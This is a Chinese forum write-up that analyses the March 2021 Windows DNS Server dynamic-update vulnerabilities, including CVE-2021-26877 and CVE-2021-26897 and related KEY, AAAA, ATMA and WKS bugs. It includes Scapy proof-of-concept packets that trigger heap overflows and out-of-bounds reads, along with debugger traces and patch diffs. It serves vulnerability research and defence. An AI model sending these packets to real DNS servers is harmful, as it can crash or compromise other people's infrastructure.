> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-267203.htm)

2021 年 3 月，微软于补丁日发布了关于 Windows DNS Server 的五个远程代码执行漏洞和两个拒绝服务漏洞，漏洞编号如下：

 

**RCE 漏洞**  
CVE-2021-26877，CVE-2021-26897（Exploitation More Likely）  
CVE-2021-26893，CVE-2021-26894，CVE-2021-26895（Exploitation Less Likely）

 

**DoS 漏洞**  
CVE-2021-26896，CVE-2021-27063（Exploitation Less Likely）

 

Windows DNS Server 存在多个远程代码执行漏洞和拒绝服务漏洞，攻击者可通过向目标主机发送特制请求来利用这些漏洞，成功利用这些漏洞可在目标主机上以 SYSTEM 权限执行任意代码或导致 DNS 服务拒绝服务。启用安全动态更新可暂时缓解这些漏洞，但攻击者依然可以通过加入域的计算机攻击启用了安全区域更新的 DNS 服务器。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_5MUBH7DD7VGBX2K.png)

### 攻击面说明

从通告的 FAQ 说明上看，这些漏洞都存在于 Windows DNS Server 进行动态区域更新的过程中。DNS 更新功能使 DNS 客户端计算机能够在发生更改时向 DNS 服务器注册并动态更新其资源记录（RR）。 使用此功能可以缩短手动管理区域记录所需的时间，从而改进 DNS 管理。动态区域更新功能可以部署在独立的 DNS 服务器或 Active Directory（AD）集成的 DNS 服务器上。最佳实践是部署与 AD 集成的 DNS，以便利用 Microsoft 的安全性，如 Kerberos 和 GSS-TSIG。

 

动态更新类型：

*   **安全动态区域更新：**验证所有 RR 更新均已使用加入域的计算机上的 GSS-TSIG 进行了数字签名。此外，可以对哪些主体可以执行动态区域更新应用更精细的控件。
*   **不安全的动态区域：**任何计算机无需任何身份验证即可更新 RR（不建议）。

在 DNS 服务器上创建区域时，可以选择启用或禁用 DNS 动态区域更新：

*   将 DNS 部署为独立服务器时，默认情况下将禁用 **“动态区域更新”** 功能，但可以在**安全 / 非安全模式**下启用该功能。
*   将 DNS 部署为 AD 集成时，默认**在安全模式下启用 “动态区域更新”**。

以下为 McAfee 关于 Windows DNS Server 部署模型制作的威胁分析表格：

 

![](https://bbs.pediy.com/upload/attach/202104/701197_4CAE59B2FSRN4PQ.png)

*   部署在公网启用动态更新的 Windows DNS Server 风险最高（这种配置是极其不推荐的，应该很少有这种配置）
*   部署 AD 集成的 Windows DNS Server 默认在安全模式下启用 “动态区域更新”，可减轻未经身份验证的攻击者的风险，但仍具有受威胁的域计算机或受信任内部人员实现 RCE 的风险

参考链接：[https://www.mcafee.com/blogs/other-blogs/mcafee-labs/seven-windows-wonders-critical-vulnerabilities-in-dns-dynamic-updates/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/seven-windows-wonders-critical-vulnerabilities-in-dns-dynamic-updates/)

### CVE-2021-26877 漏洞复现分析

*   使用 TXT length 大于 Data length 的 TXT 资源记录进行区域的动态更新时可触发此漏洞

根据 McAfee 博客中的信息可知，此漏洞在更新 TXT 记录时产生，TXT 记录中的 TXT Length 被设置为 0xFF，这个值大于资源记录里指定的 Data Length (0xbd)，这个长度表示的是这个记录后面的所有数据的长度，在当前场景下，包括所有的 TXT Length 和 TXT 数据的长度。使用 Scapy 构造数据包及抓包数据如下：

```
query = DNSQR(qname='mal', qtype='SOA')
RRTXT = DNSRR(rr,type='TXT',rdlen=0xbd,rdata='\x41'*0xff)   // 0xff 可修改为更大的数，理论上只要比 0xbd 大即可
packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,aa=1,tc=1,rd=0,ra=1,cd=1,rcode=5,qd=query,ns=RRTXT)

```

![](https://bbs.pediy.com/upload/attach/202104/701197_XBK7X68HCNXGEKS.png)

 

配置 DNS 服务器，新增一个名为 MAL 的主要区域，并设置允许动态更新。(启用页堆) 以下为漏洞触发场景，问题出现在 dns!File_PlaceStringInFileBuffer 函数中，程序尝试访问超出边界的数据：

```
0:019> g
(874.9a0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dns!File_PlaceStringInFileBuffer+0xa2:
00007ff7`50cc67f6 410fb60c24      movzx   ecx,byte ptr [r12] ds:00000271`34988000=??
 
0:004> k
 # Child-SP          RetAddr           Call Site
00 000000bc`b82ff3f0 00007ff7`50cc731e dns!File_PlaceStringInFileBuffer+0xa2
01 000000bc`b82ff440 00007ff7`50bc26a9 dns!TxtFileWrite+0x6e
02 000000bc`b82ff490 00007ff7`50c5da3d dns!RR_WriteToFile+0x205
03 000000bc`b82ff4f0 00007ff7`50c5ecc6 dns!Up_LogZoneUpdate+0x6ad
04 000000bc`b82ffc70 00007ff7`50c5ea30 dns!Up_CompleteZoneUpdate+0x26e
05 000000bc`b82ffd00 00007ff7`50c60c96 dns!Up_ExecuteUpdateEx+0x338
06 000000bc`b82ffd60 00007ff7`50c616ba dns!processWireUpdateMessage+0x456
07 000000bc`b82ffe00 00007ff7`50c550ad dns!Update_Thread+0x12a
 
0:004> !heap -p -a r12    //在 CopyWireRead 函数中调用 RR_AllocateEx 申请空间。用户可用的长度到 0x27134987ff5
    address 0000027134988000 found in
    _DPH_HEAP_ROOT @ 271126b1000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                             27132a28f08:      27134987ef0              105 -      27134987000             2000
    00007fff07e86d67 ntdll!RtlDebugAllocateHeap+0x000000000000003f
    00007fff07e2cade ntdll!RtlpAllocateHeap+0x000000000009d27e
    00007fff07d8da21 ntdll!RtlpAllocateHeapInternal+0x0000000000000991
    00007ff750cc2b4d dns!allocMemory+0x0000000000000039
    00007ff750cc2f28 dns!Mem_Alloc+0x000000000000008c
    00007ff750cc35c2 dns!RR_AllocateEx+0x000000000000003a
    00007ff750c3efd4 dns!CopyWireRead+0x0000000000000024
    00007ff750c3fed2 dns!Wire_CreateRecordFromWire+0x000000000000015a
    00007ff750c5f3d5 dns!writeUpdateFromPacketRecord+0x0000000000000035
    00007ff750c5fbe7 dns!parseUpdatePacket+0x0000000000000423
    00007ff750c60b6d dns!processWireUpdateMessage+0x000000000000032d
    00007ff750c616ba dns!Update_Thread+0x000000000000012a
    00007ff750c550ad dns!threadTopFunction+0x000000000000007d
    00007fff054a7974 KERNEL32!BaseThreadInitThunk+0x0000000000000014
    00007fff07dea271 ntdll!RtlUserThreadStart+0x0000000000000021
 
0:004> db r12-20    //这里要访问 0x27134988000 处的数据
00000271`34987fe0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`34987ff0  41 41 41 41 41 d0 d0 d0-d0 d0 d0 d0 d0 d0 d0 d0  AAAAA...........
00000271`34988000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000271`34988010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000271`34988020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000271`34988030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000271`34988040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000271`34988050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
 
0:004> db ecx-14e l160    //将 TXT 数据写入这个缓存区域
00000271`34989ff0  c0 c0 c0 c0 bb 05 fc ff-ef 0c 0c 0c 0c 0c 0c fe  ................
00000271`3498a000  0d 0a 24 53 4f 55 52 43-45 20 20 50 41 43 4b 45  ..$SOURCE  PACKE
00000271`3498a010  54 20 31 39 32 2e 31 36-38 2e 31 34 30 2e 31 32  T 192.168.140.12
00000271`3498a020  39 0d 0a 24 56 45 52 53-49 4f 4e 20 32 0d 0a 24  9..$VERSION 2..$
00000271`3498a030  41 44 44 0d 0a 41 20 20-20 20 20 20 20 20 20 20  ADD..A         
00000271`3498a040  20 20 20 20 20 20 20 20-20 20 20 20 20 30 09 54               0.T
00000271`3498a050  58 54 09 28 20 22 41 41-41 41 41 41 41 41 41 41  XT.( "AAAAAAAAAA
00000271`3498a060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a080  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a090  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a0f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a100  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000271`3498a110  41 41 5c 33 32 30 5c 33-32 30 5c 33 32 30 5c 33  AA\320\320\320\3
00000271`3498a120  32 30 5c 33 32 30 5c 33-32 30 5c 33 32 30 5c 33  20\320\320\320\3
00000271`3498a130  32 30 5c 33 32 30 5c 33-32 30 5c 33 32 30 00 c0  20\320\320\320..
00000271`3498a140  c0 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................

```

**漏洞分析**  
在 CopyWireRead 函数中，通过 RR_AllocateEx 函数申请长度为 data length 的空间，而在后续的操作中实际上会分配 data length + 0x38 + 0x10 大小的空间。0x10 为自定义头部的大小、0x38 为 RR 头部的大小。result 指向 RR 头部，然后调用 memcpy 函数向缓冲区复制 data length 长度的数据。如果 data 数据长度大于 data length 长度也可以被处理，只是复制到缓存中会被截断。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_5XNMV9WNNMAD8SJ.png)

 

接下来在 TxtFileWrite 函数中会调用 File_PlaceStringInFileBuffer 函数，分别传入待写入缓冲区地址、待写入缓冲区结尾地址、1、TXT 记录缓存地址以及分组长度（TXT Length，每组长度不超过 0xFF）。这个长度就是从 data 字段中取出的，在调用 File_PlaceStringInFileBuffer 函数前没有判断这个长度是否超出了 TXT 缓存数据的界限（在这个函数内部也没有判断）。虽然在后面会有判断（粉框内），但在第一次执行 File_PlaceStringInFileBuffer 函数的过程中就有可能会触发漏洞。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_9H8VVNZ525DHCPW.png)

 

在 File_PlaceStringInFileBuffer 函数中存在以下循环，使用传入的 length 控制循环的次数，这会导致访问超出边界的数据。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_8CRAT6SYQ6D3V9E.png)

 

**补丁分析**  
以下为补丁后的 TxtFileWrite 函数，在调用 File_PlaceStringInFileBuffer 函数前，会判断通过 TXT Length 寻址后的地址是否超出了申请的空间。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_2WSU7BQ3QTPVEDZ.png)

### CVE-2021-26897 漏洞复现分析

*   发送许多连续的 SIG 资源记录动态更新可触发此漏洞
*   将许多连续的 SIG 资源记录动态更新进行组合并将字符串进行 Base64 编码时在堆上引发 OOB 写操作

根据已有信息，可构造以下数据包。更新类型为 SIG，记录超长（signature 字段超长）。注意这次需使用 TCP 连接，Scapy 不能直接构造，以下仅为模型：

```
query = DNSQR(qname='mal', qtype='SOA')
RRSIG = DNSRRRSIG(rr,signature='\x00'*0xffb9)
packet = IP(dst=ip)/TCP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRSIG)

```

以下为抓包数据：

 

![](https://bbs.pediy.com/upload/attach/202104/701197_GKNGK3XU777S6AH.png)

 

漏洞触发现场以及函数调用堆栈如下，异常的原因是 0x2713533c000 无法访问。漏洞触发是在 Dns_SecurityKeyToBase64String 函数（用于 Base64 编码）中。

```
0:011> g
(874.c34): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dns!Dns_SecurityKeyToBase64String+0x66:
00007ff7`50d02c3a 41884001        mov     byte ptr [r8+1],al ds:00000271`3533c000=??
0:011> k
 # Child-SP          RetAddr           Call Site
00 000000bc`b867f3a8 00007ff7`50cc7f02 dns!Dns_SecurityKeyToBase64String+0x66
01 000000bc`b867f3b0 00007ff7`50bc26a9 dns!SigFileWrite+0x1f2
02 000000bc`b867f4a0 00007ff7`50bc244e dns!RR_WriteToFile+0x205
03 000000bc`b867f500 00007ff7`50bc1c92 dns!writeNodeRecordsToFile+0xa6
04 000000bc`b867f560 00007ff7`50bc1cb1 dns!zoneTraverseAndWriteToFile+0x42
05 000000bc`b867f590 00007ff7`50bc18f5 dns!zoneTraverseAndWriteToFile+0x61
06 000000bc`b867f5c0 00007ff7`50c6a2a3 dns!File_WriteZoneToFile+0x379
07 000000bc`b867f6c0 00007ff7`50c6a388 dns!Zone_WriteBack+0xfb
08 000000bc`b867f700 00007ff7`50d00580 dns!Zone_WriteBackDirtyZones+0xb4
09 000000bc`b867f790 00007ff7`50c56a74 dns!Zone_WriteBackDirtyVirtualizationInstances+0x110
0a 000000bc`b867f7c0 00007ff7`50c550ad dns!Timeout_Thread+0x544

```

查看出现问题的缓冲区，可以发现，其首地址为 0x271352bbff0 ，UserSize 为 0x80010，是在 File_WriteZoneToFile 函数中调用 Mem_Alloc 分配的。

```
0:011> !heap -p -a 271`3533c000
    address 000002713533c000 found in
    _DPH_HEAP_ROOT @ 271126b1000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                             27132a2ca90:      271352bbff0            80010 -      271352bb000            82000
    00007fff07e86d67 ntdll!RtlDebugAllocateHeap+0x000000000000003f
    00007fff07e2cade ntdll!RtlpAllocateHeap+0x000000000009d27e
    00007fff07d8da21 ntdll!RtlpAllocateHeapInternal+0x0000000000000991
    00007ff750cc2b4d dns!allocMemory+0x0000000000000039
    00007ff750cc2f28 dns!Mem_Alloc+0x000000000000008c
    00007ff750bc178c dns!File_WriteZoneToFile+0x0000000000000210
    00007ff750c6a2a3 dns!Zone_WriteBack+0x00000000000000fb
    00007ff750c6a388 dns!Zone_WriteBackDirtyZones+0x00000000000000b4
    00007ff750d00580 dns!Zone_WriteBackDirtyVirtualizationInstances+0x0000000000000110
    00007ff750c56a74 dns!Timeout_Thread+0x0000000000000544
    00007ff750c550ad dns!threadTopFunction+0x000000000000007d
    00007fff054a7974 KERNEL32!BaseThreadInitThunk+0x0000000000000014
    00007fff07dea271 ntdll!RtlUserThreadStart+0x0000000000000021
 
0:011> db 271352bbff0    //存放 MAL.dns 缓存信息
00000271`352bbff0  c0 c0 c0 c0 bb 16 fc ff-ef 0c 0c 0c 0c 0c 0c fe  ................
00000271`352bc000  3b 0d 0a 3b 20 20 44 61-74 61 62 61 73 65 20 66  ;..;  Database f
00000271`352bc010  69 6c 65 20 4d 41 4c 2e-64 6e 73 20 66 6f 72 20  ile MAL.dns for
00000271`352bc020  44 65 66 61 75 6c 74 20-7a 6f 6e 65 20 73 63 6f  Default zone sco
00000271`352bc030  70 65 20 69 6e 20 7a 6f-6e 65 20 4d 41 4c 2e 0d  pe in zone MAL..
00000271`352bc040  0a 3b 20 20 20 20 20 20-5a 6f 6e 65 20 76 65 72  .;      Zone ver
00000271`352bc050  73 69 6f 6e 3a 20 20 32-35 0d 0a 3b 0d 0a 0d 0a  sion:  25..;....
00000271`352bc060  40 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20  @

```

File_WriteZoneToFile 函数中调用 Mem_Alloc 申请大小为 0x80000 长度的空间，实际是通过 allocMemory 函数申请大小为 0x80010 长度的堆（包括 0x10 大小的头部长度）。而触发访问异常的 0x2713533c000 正好和 0x271352bbff0 相差 0x80010。下一步要查看为何会有超出边界的数据复制过来。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_PFTGVKKEUVZ64WY.png)

```
0:011> ?271`3533c000-271352bbff0
Evaluate expression: 524304 = 00000000`00080010

```

**漏洞分析**  
通过回溯及数据跟踪可关注到 zoneTraverseAndWriteToFile 函数，其第一个参数偏移 0x20 处保存了待写缓冲区的实时地址。该函数会调用 writeZoneRoot、writeNodeRecordsToFile 等函数向缓冲区写入数据。然后利用 NTree_FirstChild 以及 NTree_NextSiblingWithLocking 函数遍历 NodeRecords，然后通过回调依次对这些节点进行处理。如果该节点偏移 0x5c 处没有设置 0x10 的 flag，就会调用 writeNodeRecordsToFile 函数进行处理。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_4R896VEQBYJEGS3.png)

 

writeNodeRecordsToFile 函数中会调用 RR_WriteToFile 函数，在 RR_WriteToFile 函数中也会有判断，如果当前缓冲区距离 end_addr 的长度小于 0x11000，就将缓冲区数据写入文件，并重置缓冲区指针。但这里没有考虑 Base64 编码后是 3:4 的长度。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_T57AQ5HBN5JKWA6.png)

 

然后通过 type 类型从 RawRecordFileWrite 表中选择相应的 FileWrite 处理函数，type 18 对应的是 SigFileWrite 函数，然后调用这个函数。（IDA 下面解析错了，实际上 SigFileWrite 函数有 4 个参数）

 

![](https://bbs.pediy.com/upload/attach/202104/701197_458HK4RP76Y7MED.png)

 

SigFileWrite 函数用于解析 SIG 结构并将其写入 MAL.dns 缓存，如下所示，SigFileWrite 函数拿到的初始缓存缓冲区指针为 p_buffer(来自第二个参数)，在向其写入 SIG 头信息以及 Signer's name 后，v13 指向该缓冲区待写入的地址，然后调用 Dns_SecurityKeyToBase64String 函数对 Signature 进行 Base64 编码并将结果写入 v13 指向的地址处。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_FGYURR9BKF4F2FR.png)

 

如下所示，在调用 Dns_SecurityKeyToBase64String 函数时，第二个参数为 0xffb9，经过 Base64 编码后的数据长度为 0x154f8。查看上下文可以发现（上图所示），在向缓冲区写入的每一步几乎都用了 end_addr(用户可用的最大长度) 作为限制，唯独在 Dns_SecurityKeyToBase64String 函数的调用中没有，这可能会造成隐患。

```
0:011> g
Breakpoint 1 hit
dns!Dns_SecurityKeyToBase64String:
00007ff7`50d02bd4 48895c2408      mov     qword ptr [rsp+8],rbx ss:000000bc`b867f3b0=000000bcb867f430
0:011> r rdx
rdx=000000000000ffb9
0:011> ?ffb9/3*4
Evaluate expression: 87284 = 00000000`000154f4
0:011> db r8 l20
00000271`34c16255  00 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................
00000271`34c16265  c0 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................
 
0:011> gu
dns!SigFileWrite+0x1f2:
00007ff7`50cc7f02 4c8bc8          mov     r9,rax
 
0:011> db 271`34c16255+154f4 l20    // 写入了 0x154f8 字节数据
00000271`34c2b749  41 41 41 3d c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  AAA=............
00000271`34c2b759  c0 c0 c0 c0 c0 c0 c0 c0-c0 c0 c0 c0 c0 c0 c0 c0  ................

```

由于向 zoneTraverseAndWriteToFile 函数中传入的第一个参数是不变的，因而会一直向该缓冲区中写入数据。虽然在 RR_WriteToFile 函数和 SigFileWrite 函数中有一些判断，但仍未考虑数据 Base64 编码后的长度，因而在多次循环写入的时候，正好在 Dns_SecurityKeyToBase64String 函数的执行过程中触发 OOB 写操作。

 

**补丁分析**  
更新后的 DNS 在 SigFileWrite 函数中调用 Dns_SecurityKeyToBase64String 函数前会进行以下判断。会考虑当前缓冲区的剩余空间是否可以容纳 Base64 编码后的 Signature 数据。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_HY8WKJCAFBCTJXU.png)

### 补丁对比分析

以下为 3 月更新内发生变动的函数列表，包括前面已经分析过的 TxtFileWrite 函数和 SigFileWrite 函数。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_8PPUXHH6WD7QSBV.png)

*   **KEY 记录问题**

类似地，在 KeyFileWrite 函数中也加入了 Base64 编码预检查（粉框对应）。但不是这个的问题，补丁前已经有 a3 - (signed __int64)a2 < (signed int)(2 * v3) 这个判断了，可以阻断 CVE-2021-26897 式触发。真正的原因我用蓝框圈起来了，v3 来自 Data Length - 4，而且它是无符号 int 型，如果 Data Length 小于 4，会产生整数溢出。而它又作为 Dns_SecurityKeyToBase64String 函数的第二个参数，该函数指明待编码数据长度，4 个字节的大整数，肯定会溢出的啦。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_WH4MEW5N54YMS6A.png)

 

构造 POC 如下，触发场景见下图：

```
query = DNSQR(qname='mal', qtype='SOA')
RRKEY = DNSRR(rrname=str(RandString(8))+'.mal',type='KEY',rdlen=0 ,rdata='\x00'*0xff)
packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRKEY)

```

![](https://bbs.pediy.com/upload/attach/202104/701197_VBJUK6MCV93Y7CW.png)

 

另外，值得注意的是，CopyWireRead 函数中加入了以下判断，经过分析可知，当接收 update 请求类型为 WKS、AAAA 或 ATMA 时，会分别判断其 Data Length 是否小于 5、0x10、2。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_MVSESN6Z48Z2PVV.png)

*   **AAAA 记录问题**

该请求会由 AaaaFileWrite 函数进行处理，经过前面的分析可知，a1 偏移 0x38 处指向 Data Length 字段后的记录数据。经过 CopyWireRead 函数的处理，a1 偏移 0x38 处指向的数据的有效长度等于 Data Length 大小。如果 Data Length 小于 XXXFileWrite 函数中函数调用所需的数据长度，就有可能访问到缓冲区边界之外的数据（如 RtlIpv6AddressToStringA 函数）。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_DK3VWUJ4QKPT8B7.png)

 

以下为 RtlIpv6AddressToStringA 函数原型，其第一个参数类型为 in6_addr，该长度应为 16 个字节。因而在新的 CopyWireRead 函数中会判断 Data Length 大小是否小于 0x10。

```
NTSYSAPI PSTR RtlIpv6AddressToStringA(
  const in6_addr *Addr,
  PSTR           S
);
 
typedef struct in6_addr {
  union {
    UCHAR  Byte[16];
    USHORT Word[8];
  } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;
 
0:008> db rdx l10    //例：fe80::20c:29ff:fe5e:7b11
00000271`26ed9ecd  fe 80 00 00 00 00 00 00-02 0c 29 ff fe 5e 7b 11  ..........)..^{.

```

新的 AaaaFileWrite 函数中也会加入对待读缓冲区和待写缓冲区的判断。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_E4AR7BPU42PEAQB.png)

 

构造如下 POC 进行验证，崩溃场景如下图：

```
query = DNSQR(qname='mal', qtype='SOA')
RRAaaa = DNSRR(rrname=str(RandString(8))+'.mal',type='AAAA',rdlen=1,rdata='fe80::20c:29ff:fe5e:7b11')
packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRAaaa)

```

![](https://bbs.pediy.com/upload/attach/202104/701197_Q6XMXVDHNAUAKBB.png)

*   **ATMA 记录问题**

下面再来看 AtmaFileWrite 函数，CopyWireRead 函数中给的限制是：它的 Data Length 长度要大于等于 2。对比补丁前后，对 Data Length 长度判断吸引了我的注意（右边），如果是 0，就走结束流程。那么再看不补丁前的函数，v6 为 Data Length - 1 的无符号数，当 Data Length 为 0 时，v6 为 0xFFFFFFFF , 会产生整数溢出。而且，当 Data 数据的第一个字节为 1 时，会以 v6 做为控制长度向缓冲区复制数据（堆溢出）。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_YJFMABNPT462E4D.png)

 

构造 ATMA 更新请求如下，为了使 Data Length 为 0 时，满足漏洞触发条件，需要在发送恶意请求时发送一些 “铺垫” 数据，即保证 Data 数据的第一个字节（a1 偏移 0x38 处）为 1，且分配的大小一致。那么当触发漏洞的请求到来时，申请的堆可能就来自之前的数据包。例：rdl 先 1（多个） 后 0（分配到 0x50 大小的自定义堆上），崩溃现场如下图：

```
query = DNSQR(qname='mal', qtype='SOA')
RRATMA = DNSRR(rr,type='ATMA',rdlen=rdl,rdata='\x01'*0xff)
packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,qd=query,ns=RRATMA)

```

![](https://bbs.pediy.com/upload/attach/202104/701197_8C5GNQBRHCDK373.png)

*   **WKS 记录问题**

WksFileWrite 函数中会打印 IP 地址，还有协议名称，这需要保证数据必须大于等于 5。如果发送的数据不到 5，就会读取到后面的数据，这样会存在一定程度的信息泄露（然而我觉得没什么用）。

 

![](https://bbs.pediy.com/upload/attach/202104/701197_ZCU2AX4DBYG2YH9.png)

### 总结

微软 3 月补丁日公开了 Windows DNS Server 中存在的多个远程代码执行漏洞和拒绝服务漏洞，这些漏洞都存在于 Windows DNS Server 进行动态区域更新的过程中。攻击者可通过向目标主机发送特制请求来利用这些漏洞，成功利用这些漏洞可在目标主机上以 SYSTEM 权限执行任意代码或导致 DNS 服务拒绝服务。通过对 McAfee 博客中的细节描述进行分析以及补丁比对，笔者构造 POC 复现了其中的 5 个（不包括 WKS）。如有不足之处，欢迎批评指正，期待技术交流。

### 参考链接

https://www.mcafee.com/blogs/other-blogs/mcafee-labs/seven-windows-wonders-critical-vulnerabilities-in-dns-dynamic-updates/

 

https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003

 

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26877

 

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26897

[[看雪官方培训] Unicorn Trace 还原 Ollvm 算法！《安卓高级研修班》2021 年 6 月班开始招生！！](https://bbs.pediy.com/thread-267018.htm)